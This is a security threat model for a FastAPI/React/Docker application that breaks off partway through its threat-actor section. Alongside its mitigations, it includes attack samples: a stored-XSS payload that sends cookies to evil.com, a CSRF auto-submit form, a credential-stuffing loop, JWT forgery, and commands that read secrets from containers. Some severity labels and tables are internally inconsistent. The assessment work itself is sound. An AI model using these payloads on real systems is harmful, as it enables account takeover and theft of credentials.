# Application Threat Model and Risk Assessment

## Executive Summary

This threat model analyzes the full-stack FastAPI application using STRIDE methodology to identify security threats across the web application, API, and infrastructure layers. The application consists of a FastAPI backend (`backend/app/`), React/TypeScript frontend (`frontend/src/`), PostgreSQL database, and containerized deployment via Docker Compose with Traefik reverse proxy.

**Critical Risk Areas Identified:**
- JWT authentication implementation with weak secret key management
- Missing CSRF protection on state-changing endpoints
- Container security exposure through environment variable handling
- Database credential exposure in Docker Compose configuration
- Insufficient rate limiting on authentication endpoints

---

## 1. Application Architecture & Data Flow

### 1.1 System Components

**Reference:** `docker-compose.yml`

```yaml
Component Mapping:
- Frontend: Node.js container (port 80) → dashboard.${DOMAIN}
- Backend: FastAPI container (port 8000) → api.${DOMAIN}
- Database: PostgreSQL 17 container → internal network only
- Admin Interface: Adminer container → adminer.${DOMAIN}
- Reverse Proxy: Traefik (external network: traefik-public)
```

### 1.2 Authentication Flow

**Reference:** `backend/app/core/security.py`, `backend/app/api/routes/login.py`

```
User → Frontend → POST /api/v1/login/access-token
     ↓
Backend validates credentials (verify_password)
     ↓
JWT token created with HS256 algorithm
     ↓
Token contains: {"exp": timestamp, "sub": user_id}
     ↓
Token stored in client, sent in Authorization header
```

**Security Implementation:**
```python
# backend/app/core/security.py
ALGORITHM = "HS256"
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

def create_access_token(subject: str | Any, expires_delta: timedelta) -> str:
    expire = datetime.now(timezone.utc) + expires_delta
    to_encode = {"exp": expire, "sub": str(subject)}
    encoded_jwt = jwt.encode(to_encode, settings.SECRET_KEY, algorithm=ALGORITHM)
    return encoded_jwt
```

---

## 2. STRIDE Threat Analysis

### 2.1 Spoofing Identity Threats

#### T-SP-001: JWT Secret Key Compromise
**Severity:** CRITICAL | **CVSS Score:** 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

**Threat Description:** The JWT implementation relies on a single `SECRET_KEY` environment variable. If compromised, attackers can forge valid tokens for any user.

**Attack Vector:**
```
Attacker obtains SECRET_KEY from:
1. Environment variable exposure in container logs
2. Memory dump from running container
3. Source code repository if hardcoded
4. Docker Compose environment file (.env) exposure

Attacker generates JWT:
jwt.encode({"exp": future_time, "sub": "admin_user_id"}, 
           compromised_secret, algorithm="HS256")
```

**Vulnerable Code:** `backend/app/core/security.py:12-15`
```python
def create_access_token(subject: str | Any, expires_delta: timedelta) -> str:
    expire = datetime.now(timezone.utc) + expires_delta
    to_encode = {"exp": expire, "sub": str(subject)}
    encoded_jwt = jwt.encode(to_encode, settings.SECRET_KEY, algorithm=ALGORITHM)
```

**Mitigation:**
- Rotate SECRET_KEY periodically via automated secrets management
- Use asymmetric RS256 algorithm instead of HS256
- Implement key versioning with `kid` (key ID) in JWT header
- Store secrets in HashiCorp Vault or AWS Secrets Manager, not environment variables
- Add token binding to client IP or device fingerprint

#### T-SP-002: Weak Password Hashing Parameters
**Severity:** MEDIUM | **CVSS Score:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Threat Description:** Default bcrypt parameters may be insufficient for strong password protection.

**Vulnerable Code:** `backend/app/core/security.py:7`
```python
pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
# No explicit rounds parameter - defaults to 12 rounds
```

**Mitigation:**
- Set explicit bcrypt rounds to 14+ for stronger key derivation
- Implement adaptive hashing (increase rounds over time)
- Add pepper (server-side secret) to password hashing

### 2.2 Tampering Threats

#### T-TM-001: Missing CSRF Protection
**Severity:** HIGH | **CVSS Score:** 7.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)

**Threat Description:** State-changing endpoints lack CSRF token validation, allowing malicious sites to perform actions on behalf of authenticated users.

**Attack Scenario:**
```html
<!-- Malicious site attacks items.py endpoints -->
<form action="https://api.example.com/api/v1/items/" method="POST">
  <input name="title" value="Malicious Item">
  <input name="description" value="Injected content">
</form>
<script>
  // If user has valid session cookie, this executes
  document.forms[0].submit();
</script>
```

**Vulnerable Endpoints:** `backend/app/api/routes/items.py`, `backend/app/api/routes/users.py`
- POST /api/v1/items/ (create item)
- PUT /api/v1/items/{id} (update item)
- DELETE /api/v1/items/{id} (delete item)
- PATCH /api/v1/users/me (update user profile)
- DELETE /api/v1/users/{user_id} (delete user)

**Mitigation:**
- Implement Double Submit Cookie pattern for CSRF tokens
- Add `SameSite=Strict` attribute to session cookies
- Validate `Origin` and `Referer` headers on state-changing requests
- Require custom headers (e.g., `X-Requested-With: XMLHttpRequest`) for API calls

#### T-TM-002: Unrestricted File Upload (If Implemented)
**Severity:** HIGH | **CVSS Score:** 8.2 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L)

**Note:** File upload functionality not visible in provided routes but commonly added. Including for completeness.

**Mitigation:**
- Validate file MIME types and extensions server-side
- Store uploads outside web root with randomized names
- Implement virus scanning on upload
- Enforce file size limits

### 2.3 Repudiation Threats

#### T-RP-001: Insufficient Audit Logging
**Severity:** MEDIUM | **CVSS Score:** 4.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)

**Threat Description:** No evidence of comprehensive audit logging for security-critical operations.

**Missing Audit Events:**
- Authentication attempts (success/failure) with source IP
- Authorization failures (attempted privilege escalation)
- Data access/modification (who, what, when)
- Administrative actions (user creation, role changes)
- Configuration changes

**Reference:** `backend/app/api/routes/login.py` - no logging of authentication events

**Mitigation:**
- Implement structured logging with user ID, IP, timestamp, action
- Send logs to SIEM (Sentry DSN configured but insufficient for auditing)
- Ensure logs are tamper-proof (write-once storage)
- Retain logs per compliance requirements (GDPR, SOC2)

### 2.4 Information Disclosure Threats

#### T-ID-001: Sensitive Data in Environment Variables
**Severity:** HIGH | **CVSS Score:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Threat Description:** Critical secrets exposed in Docker environment configuration.

**Vulnerable Configuration:** `docker-compose.yml:54-70`
```yaml
environment:
  - SECRET_KEY=${SECRET_KEY?Variable not set}
  - FIRST_SUPERUSER_PASSWORD=${FIRST_SUPERUSER_PASSWORD?Variable not set}
  - POSTGRES_PASSWORD=${POSTGRES_PASSWORD?Variable not set}
  - SMTP_PASSWORD=${SMTP_PASSWORD}
```

**Attack Vectors:**
1. Container inspection: `docker inspect <container_id>` exposes all env vars
2. Kubernetes secret exposure if migrated
3. CI/CD pipeline logs capturing environment
4. Process listing in container: `cat /proc/<pid>/environ`

**Mitigation:**
- Use Docker secrets instead of environment variables
- Mount secrets as files in `/run/secrets/`
- Implement HashiCorp Vault integration
- Never log environment variables containing credentials

#### T-ID-002: Database Credentials in Plaintext
**Severity:** HIGH | **CVSS Score:** 7.5 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

**Vulnerable Configuration:** `docker-compose.yml:11-18`
```yaml
environment:
  - POSTGRES_PASSWORD=${POSTGRES_PASSWORD?Variable not set}
  - POSTGRES_USER=${POSTGRES_USER?Variable not set}
  - POSTGRES_DB=${POSTGRES_DB?Variable not set}
```

**Mitigation:**
- Use Docker secrets for database passwords
- Implement certificate-based authentication for PostgreSQL
- Encrypt .env files with git-crypt or SOPS
- Use IAM authentication if on AWS RDS

#### T-ID-003: Adminer Public Exposure
**Severity:** CRITICAL | **CVSS Score:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Vulnerable Configuration:** `docker-compose.yml:20-41`
```yaml
adminer:
  labels:
    - traefik.http.routers.${STACK_NAME}-adminer-https.rule=Host(`adminer.${DOMAIN}`)
```

**Threat:** Adminer database management interface exposed to internet without authentication restrictions.

**Attack Impact:**
- Direct database access if credentials compromised
- SQL injection through Adminer interface
- Database enumeration and schema discovery

**Mitigation:**
- Remove Adminer from production deployments
- Implement IP whitelisting via Traefik middleware
- Require VPN access for administrative interfaces
- Use Traefik BasicAuth middleware with strong passwords

#### T-ID-004: Verbose Error Messages
**Severity:** LOW | **CVSS Score:** 3.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Threat Description:** Stack traces and detailed error messages may leak implementation details.

**Mitigation:**
- Configure FastAPI `debug=False` in production
- Implement custom exception handlers
- Log detailed errors server-side only
- Return generic error messages to clients

### 2.5 Denial of Service Threats

#### T-DS-001: Missing Rate Limiting on Authentication
**Severity:** HIGH | **CVSS Score:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

**Threat Description:** Login endpoint vulnerable to credential stuffing and brute force attacks.

**Vulnerable Endpoint:** `backend/app/api/routes/login.py` (no rate limiting visible)

**Attack Scenario:**
```python
# Attacker script
for username, password in credential_list:
    requests.post("https://api.example.com/api/v1/login/access-token",
                  data={"username": username, "password": password})
# No restrictions = unlimited login attempts
```

**Mitigation:**
- Implement rate limiting: 5 failed attempts per IP per 15 minutes
- Use slowloris protection at Traefik level
- Add exponential backoff after failed attempts
- Implement CAPTCHA after 3 failed attempts
- Monitor for distributed attacks across IPs

#### T-DS-002: Database Connection Pool Exhaustion
**Severity:** MEDIUM | **CVSS Score:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L)

**Threat Description:** Unlimited concurrent requests can exhaust database connections.

**Mitigation:**
- Configure SQLAlchemy pool size limits
- Implement connection timeouts
- Use read replicas for heavy queries
- Add request queuing with circuit breaker pattern

#### T-DS-003: Container Resource Exhaustion
**Severity:** MEDIUM | **CVSS Score:** 5.3 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L)

**Vulnerable Configuration:** `docker-compose.yml` - no resource limits defined

```yaml
# Missing resource constraints
backend:
  deploy:
    resources:
      limits:
        cpus: '1'
        memory: 1G
```

**Mitigation:**
- Add CPU and memory limits to all containers
- Implement OOM (Out of Memory) handling
- Configure swap limits
- Use Kubernetes resource quotas if migrating

### 2.6 Elevation of Privilege Threats

#### T-EP-001: Missing Authorization Checks
**Severity:** CRITICAL | **CVSS Score:** 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

**Threat Description:** Insufficient verification of user permissions on resource access.

**Analysis Required:** Need to examine dependency injection patterns in route files for authorization enforcement.

**Vulnerable Pattern Risk:**
```python
# If routes lack owner verification:
@router.delete("/api/v1/items/{id}")
async def delete_item(id: uuid.UUID, current_user: User):
    # VULNERABLE: No check if current_user owns item
    return crud.item.remove(db, id=id)
```

**Mitigation:**
- Implement object-level authorization checks
- Verify resource ownership before operations
- Use dependency injection for consistent auth checks
- Adopt Casbin or OPA for policy enforcement

#### T-EP-002: Superuser Creation Vulnerability
**Severity:** HIGH | **CVSS Score:** 7.2 (AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)

**Threat Description:** Initial superuser credentials in environment variables.

**Vulnerable Configuration:** `docker-compose.yml:58-59`
```yaml
- FIRST_SUPERUSER=${FIRST_SUPERUSER?Variable not set}
- FIRST_SUPERUSER_PASSWORD=${FIRST_SUPERUSER_PASSWORD?Variable not set}
```

**Mitigation:**
- Force password change on first login
- Generate random passwords during deployment
- Disable initial superuser after setup
- Use multi-factor authentication for admin accounts

---

## 3. API Security Threats

### 3.1 Injection Vulnerabilities

#### T-IN-001: SQL Injection (Low Risk with ORM)
**Severity:** MEDIUM | **CVSS Score:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Assessment:** Application likely uses SQLAlchemy ORM which provides parameterized queries. Risk exists if raw SQL queries used.

**Risk Areas:**
- Custom query filters
- Search functionality
- Sorting/ordering parameters

**Mitigation:**
- Audit for raw SQL execution
- Use ORM query builders exclusively
- Validate and sanitize all user inputs
- Implement prepared statements if raw SQL required

#### T-IN-002: NoSQL Injection (Not Applicable)
**Assessment:** PostgreSQL used, not NoSQL database. Threat not applicable.

#### T-IN-003: Command Injection
**Severity:** CRITICAL | **CVSS Score:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Risk:** If application executes system commands with user input (e.g., file processing).

**Mitigation:**
- Avoid system command execution
- Use native Python libraries instead of shell commands
- Sanitize inputs with strict whitelists
- Run containers with minimal privileges

### 3.2 Broken Authentication

#### T-BA-001: JWT Token Expiration
**Severity:** MEDIUM | **CVSS Score:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Reference:** `backend/app/core/security.py:12`
```python
def create_access_token(subject: str | Any, expires_delta: timedelta) -> str:
    expire = datetime.now(timezone.utc) + expires_delta
```

**Issue:** Token lifetime controlled by caller. Risk of excessively long-lived tokens.

**Mitigation:**
- Enforce maximum token lifetime (15-30 minutes)
- Implement refresh token rotation
- Add token revocation list (Redis-based)
- Monitor for token reuse after logout

#### T-BA-002: No Token Binding
**Severity:** MEDIUM | **CVSS Score:** 6.5 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N)

**Threat:** Stolen JWT tokens usable from any device/IP.

**Mitigation:**
- Bind tokens to client IP address (add to JWT claims)
- Implement device fingerprinting
- Detect anomalous usage patterns (geolocation changes)

### 3.3 Excessive Data Exposure

#### T-EX-001: Mass Assignment Vulnerability
**Severity:** HIGH | **CVSS Score:** 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N)

**Threat:** API may accept unexpected fields in request bodies, modifying protected attributes.

**Risk Pattern:**
```python
# If using direct model updates:
@router.patch("/users/me")
async def update_user(user_update: dict):
    # VULNERABLE: user_update might contain "is_superuser": true
    user.update(user_update)
```

**Mitigation:**
- Use Pydantic models with explicit field definitions
- Implement field-level permissions
- Whitelist allowed update fields
- Validate against schema before database operations

### 3.4 Broken Access Control

#### T-AC-001: Insecure Direct Object References (IDOR)
**Severity:** HIGH | **CVSS Score:** 8.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Threat Description:** Users can access/modify resources by manipulating IDs without authorization checks.

**Attack Scenario:**
```
User A (ID: 123) makes request:
GET /api/v1/items/456  # Item owned by User B

If no ownership check:
  → User A accesses User B's data
```

**Vulnerable Endpoint Pattern:** All endpoints in `backend/app/api/routes/items.py`, `backend/app/api/routes/users.py` accepting ID parameters.

**Mitigation:**
- Verify resource ownership in every CRUD operation
- Use UUIDs instead of sequential integers
- Implement row-level security in PostgreSQL
- Log all authorization failures

---

## 4. Frontend Security Threats

### 4.1 Cross-Site Scripting (XSS)

#### T-XS-001: Reflected XSS
**Severity:** HIGH | **CVSS Score:** 7.1 (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L)

**Assessment:** React provides automatic XSS protection via JSX escaping. Risk if using `dangerouslySetInnerHTML`.

**Mitigation:**
- Audit for `dangerouslySetInnerHTML` usage
- Implement Content Security Policy (CSP) headers
- Sanitize user-generated HTML with DOMPurify
- Validate all API responses before rendering

#### T-XS-002: Stored XSS
**Severity:** CRITICAL | **CVSS Score:** 8.7 (AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N)

**Threat:** Malicious scripts stored in database, executed when viewed by other users.

**Attack Vector:**
```
POST /api/v1/items/
{
  "title": "Normal Title",
  "description": "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
}
```

**Mitigation:**
- Sanitize inputs on backend before storage
- Encode outputs when rendering
- Implement CSP: `script-src 'self'`
- Use HTTPOnly flag on cookies

### 4.2 Client-Side Security

#### T-CL-001: Sensitive Data in Client Storage
**Severity:** MEDIUM | **CVSS Score:** 5.5 (AV:P/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Threat:** JWT tokens or sensitive data stored in localStorage vulnerable to XSS.

**Reference:** `frontend/src/client/` - need to verify token storage mechanism

**Mitigation:**
- Store tokens in HttpOnly cookies instead of localStorage
- Use sessionStorage for temporary data
- Encrypt sensitive data before client storage
- Clear storage on logout

#### T-CL-002: Insecure API Communication
**Severity:** MEDIUM | **CVSS Score:** 6.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N)

**Configuration:** `docker-compose.yml:126-127`
```yaml
args:
  - VITE_API_URL=https://api.${DOMAIN}
```

**Assessment:** HTTPS enforced via Traefik. Verify certificate validation in client.

**Mitigation:**
- Pin TLS certificates in mobile apps
- Implement certificate transparency monitoring
- Add Subresource Integrity (SRI) for external scripts

---

## 5. Infrastructure & Container Threats

### 5.1 Container Security

#### T-CT-001: Container Escape via Privileged Mode
**Severity:** CRITICAL | **CVSS Score:** 9.3 (AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Assessment:** `docker-compose.yml` does not explicitly set privileged mode (good), but no explicit security hardening.

**Mitigation:**
- Add `security_opt: ["no-new-privileges:true"]`
- Use read-only root filesystem where possible
- Drop unnecessary Linux capabilities
- Run as non-root user (add `user: 1000:1000`)

**Hardened Configuration:**
```yaml
backend:
  security_opt:
    - no-new-privileges:true
  cap_drop:
    - ALL
  cap_add:
    - NET_BIND_SERVICE
  read_only: true
  user: "1000:1000"
```

#### T-CT-002: Insecure Base Images
**Severity:** HIGH | **CVSS Score:** 7.8 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

**Reference:** `docker-compose.yml:5`
```yaml
db:
  image: postgres:17  # Full image, not alpine/distroless
```

**Threat:** Large images contain unnecessary packages with known vulnerabilities.

**Mitigation:**
- Use Alpine Linux base images (postgres:17-alpine)
- Implement multi-stage builds to minimize final image
- Scan images with Trivy/Clair in CI pipeline
- Update base images regularly (automated Dependabot)

#### T-CT-003: Exposed Docker Socket
**Severity:** CRITICAL | **CVSS Score:** 10.0 (AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H)

**Assessment:** No evidence of Docker socket mounting in compose file (good practice).

**Prevention:**
- Never mount `/var/run/docker.sock` in containers
- Use Docker API over TLS if remote access needed

### 5.2 Network Security

#### T-NT-001: Inadequate Network Segmentation
**Severity:** MEDIUM | **CVSS Score:** 6.5 (AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Configuration:** `docker-compose.yml:171-174`
```yaml
networks:
  traefik-public:
    external: true
  # default network implicit
```

**Threat:** All containers on shared default network can communicate freely.

**Mitigation:**
- Create separate networks for frontend/backend/database tiers
- Restrict database to backend-only network
- Use Docker network policies for microsegmentation

**Secure Configuration:**
```yaml
networks:
  frontend-net:
  backend-net:
  db-net:
    internal: true  # No external connectivity

backend:
  networks:
    - traefik-public
    - backend-net
    - db-net

db:
  networks:
    - db-net  # Isolated from internet
```

#### T-NT-002: Missing TLS Internal Communication
**Severity:** MEDIUM | **CVSS Score:** 5.9 (AV:A/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Threat:** Traffic between containers unencrypted. Risk if container network compromised.

**Mitigation:**
- Implement mutual TLS (mTLS) between services
- Use service mesh (Istio/Linkerd) for automatic encryption
- Encrypt database connections (PostgreSQL SSL mode)

### 5.3 Traefik Reverse Proxy

#### T-TR-001: Missing Security Headers
**Severity:** MEDIUM | **CVSS Score:** 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N)

**Configuration:** `docker-compose.yml` - no security headers middleware defined

**Missing Headers:**
- Content-Security-Policy
- X-Frame-Options
- X-Content-Type-Options
- Strict-Transport-Security (HSTS)
- Permissions-Policy

**Mitigation Configuration:**
```yaml
labels:
  - traefik.http.middlewares.security-headers.headers.contentSecurityPolicy=default-src 'self'
  - traefik.http.middlewares.security-headers.headers.stsSeconds=31536000
  - traefik.http.middlewares.security-headers.headers.stsIncludeSubdomains=true
  - traefik.http.middlewares.security-headers.headers.frameDeny=true
  - traefik.http.routers.backend-https.middlewares=security-headers
```

#### T-TR-002: HTTPS Redirect Timing Attack
**Severity:** LOW | **CVSS Score:** 3.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Configuration:** `docker-compose.yml:108`
```yaml
- traefik.http.routers.${STACK_NAME}-backend-http.middlewares=https-redirect
```

**Threat:** Initial HTTP request before redirect may leak sensitive data.

**Mitigation:**
- Implement HSTS preloading
- Configure clients to always use HTTPS
- Return 301 permanent redirect

---

## 6. Risk Scoring Matrix

### 6.1 Critical Risks (CVSS 9.0-10.0)

| ID | Threat | CVSS | Impact | Likelihood |
|---|---|---|---|---|
| T-SP-001 | JWT Secret Key Compromise | 9.1 | Critical | Medium |
| T-ID-003 | Adminer Public Exposure | 9.8 | Critical | High |
| T-IN-003 | Command Injection | 9.8 | Critical | Low |
| T-CT-003 | Docker Socket Exposure | 10.0 | Critical | None |

### 6.2 High Risks (CVSS 7.0-8.9)

| ID | Threat | CVSS | Impact | Likelihood |
|---|---|---|---|---|
| T-TM-001 | Missing CSRF Protection | 7.1 | High | High |
| T-TM-002 | Unrestricted File Upload | 8.2 | High | Medium |
| T-ID-001 | Secrets in Environment Vars | 7.5 | High | Medium |
| T-ID-002 | Database Credentials Exposure | 7.5 | High | Medium |
| T-DS-001 | No Authentication Rate Limiting | 7.5 | High | High |
| T-EP-001 | Missing Authorization Checks | 8.8 | Critical | Medium |
| T-EP-002 | Superuser Creation Vulnerability | 7.2 | High | Medium |
| T-EX-001 | Mass Assignment Vulnerability | 7.5 | High | Medium |
| T-AC-001 | IDOR Vulnerabilities | 8.1 | High | High |
| T-XS-001 | Reflected XSS | 7.1 | High | Medium |
| T-XS-002 | Stored XSS | 8.7 | Critical | Low |
| T-CT-002 | Insecure Base Images | 7.8 | High | High |

### 6.3 Medium Risks (CVSS 4.0-6.9)

| ID | Threat | CVSS | Impact | Likelihood |
|---|---|---|---|---|
| T-SP-002 | Weak Password Hashing | 5.3 | Medium | Low |
| T-RP-001 | Insufficient Audit Logging | 4.3 | Medium | High |
| T-ID-004 | Verbose Error Messages | 3.7 | Low | High |
| T-DS-002 | Connection Pool Exhaustion | 5.3 | Medium | Medium |
| T-DS-003 | Container Resource Exhaustion | 5.3 | Medium | Medium |
| T-IN-001 | SQL Injection (ORM) | 6.5 | Medium | Low |
| T-BA-001 | JWT Token Expiration | 5.3 | Medium | High |
| T-BA-002 | No Token Binding | 6.5 | Medium | Medium |
| T-CL-001 | Sensitive Data in Client Storage | 5.5 | Medium | Medium |
| T-CL-002 | Insecure API Communication | 6.5 | Medium | Low |
| T-NT-001 | Inadequate Network Segmentation | 6.5 | Medium | Medium |
| T-NT-002 | Missing Internal TLS | 5.9 | Medium | Low |
| T-TR-001 | Missing Security Headers | 5.3 | Medium | High |

---

## 7. Threat Actor Profiles

### 7.1 External Threat Actors

#### TA-001: Opportunistic Attackers (Script Kiddies)
**Motivation:** Financial gain, reputation  
**Capabilities:** Low - automated scanning tools  
**Target Threats:** T-ID-003 (Adminer), T-DS-